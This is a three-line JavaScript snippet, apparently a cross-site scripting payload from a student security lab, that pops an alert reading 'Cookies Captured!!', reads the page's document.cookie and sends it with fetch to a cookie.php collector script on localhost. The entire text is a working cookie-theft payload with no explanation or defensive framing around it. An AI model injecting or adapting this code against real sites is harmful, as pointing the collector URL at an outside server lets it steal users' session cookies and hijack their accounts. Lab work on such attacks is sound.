alert("Cookies Captured!!");
const cookie = document.cookie;
fetch(`http://localhost/TP056561-SecurityImplemented/cookie.php?cookie=${cookie}`).then(res => {console.log(res)});